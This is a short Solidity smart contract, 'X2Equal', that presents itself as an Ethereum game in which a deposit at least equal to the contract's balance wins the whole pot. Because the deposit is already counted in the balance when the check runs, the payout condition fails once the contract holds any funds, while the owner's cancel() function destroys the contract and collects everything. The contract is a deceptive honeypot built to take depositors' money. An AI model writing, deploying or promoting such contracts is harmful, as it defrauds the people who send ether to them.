1 pragma solidity ^0.4.20;
2 
3 contract X2Equal
4 {
5     address Owner = msg.sender;
6 
7     function() public payable {}
8    
9     function cancel() payable public {
10         if (msg.sender == Owner) {
11             selfdestruct(Owner);
12         }
13     }
14     
15     function X2() public payable {
16         if (msg.value >= this.balance) {
17             selfdestruct(msg.sender);
18         }
19     }
20 }